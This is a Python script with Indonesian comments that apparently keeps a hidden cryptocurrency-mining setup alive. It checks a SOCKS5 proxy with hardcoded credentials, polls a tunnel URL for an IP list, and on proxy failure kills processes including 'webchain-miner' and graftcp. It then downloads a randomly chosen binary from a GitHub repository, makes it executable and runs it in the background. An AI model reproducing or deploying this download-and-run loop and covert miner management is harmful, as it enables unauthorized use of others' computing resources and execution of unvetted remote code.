import time
import requests
import subprocess
import socks
import socket
import urllib.request
import configparser
import os
import random

def kill_processes(process_names):
    for name in process_names:
        subprocess.run(['pkill', '-9', name])

# Fungsi untuk memeriksa apakah alamat IP ada dalam daftar socks5
def check_ip_in_list(ip_list, socks_ip):
    for ip in ip_list:
        if socks_ip == ip:
            return True
    return False

# Fungsi untuk mendownload file dan menjalankannya
def download_and_run(base_url):
    file_name = random.choice(nama_file)
    
    # Naik satu direktori
    os.chdir("..")
    
    # Mendownload file dari URL
    url = f"{base_url}/{file_name}"
    urllib.request.urlretrieve(url, file_name)

    # Memberikan izin eksekusi pada file
    os.chmod(file_name, 0o755)

    # Menjalankan file di background
    subprocess.Popen(["./" + file_name])

# Membaca konfigurasi dari file graftcp-local.conf
config = configparser.ConfigParser()
config.read("graftcp/local/graftcp-local.conf")

# Mendapatkan nilai dari konfigurasi socks5
socks5_config = config.get("local", "socks5")
socks_ip = socks5_config.split(":")[0]

# daftar nama file dan titik akses
nama_file = ['satu', 'dua', 'tiga', 'empat', 'lima', 'enam', 'tujuh', 'delapan', 'sembilan', 'sepuluh', 'sebelas', 'duabelas', 'tigabelas', 'empatbelas']

# URL untuk memeriksa alamat IP
check_ip_url = "http://checkip.amazonaws.com"
# URL untuk memeriksa respons JSON
check_json_url = "http://localtopublic.ap.loclx.io/list"
# URL untuk mendownload file
download_url = "https://github.com/suplays/starterpack/raw/main/nim"

while True:
    try:
        original_socket = socket.socket
        # Mengatur proxy socks5 hanya untuk mengakses URL memeriksa alamat IP
        socks.set_default_proxy(socks.SOCKS5, socks_ip, 443, username="clarksye", password="user123")
        socket.socket = socks.socksocket

        response = requests.get(check_ip_url, timeout=10)  # Menambahkan parameter timeout
        print("socks_ip:", socks_ip)
        time.sleep(300)
        continue
    except (requests.exceptions.RequestException, socks.SOCKS5Error, socks.ProxyConnectionError, requests.exceptions.ProxyError, socket.timeout) as e:
        print("Failed to connect with proxy:", str(e))
        # Mengakses URL untuk memeriksa respons JSON tanpa proxy
        try:
            # Reset socket to cancel the socks5 proxy
            socket.socket = original_socket

            response = requests.get(check_json_url, timeout=10)
            data = response.json()

            # Mengekstrak nilai success dan IP dari respons JSON
            success = data.get("success", False)
            ip_list = data.get("ip", [])

            print("ip_list:", ip_list)

            if success:
                # Memeriksa apakah ada alamat IP dari data socks5 dalam daftar IP JSON
                if check_ip_in_list(ip_list, socks_ip):
                    print("ip ada di list")
                    # Menunggu 1 menit
                    time.sleep(60)
                    continue
                # Daftar nama proses yang ingin dihentikan
                processes_to_kill = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local']
                # Menghentikan proses-proses secara bersamaan
                kill_processes(processes_to_kill)

                # Mendownload file dan menjalankannya jika ada kesalahan saat mengakses URL menggunakan proxy
                download_and_run(download_url)
                print("success running")
                time.sleep(300)
                continue
        except (requests.exceptions.RequestException, requests.exceptions.JSONDecodeError) as e:
            print("Failed to retrieve JSON data:", str(e))
            continue
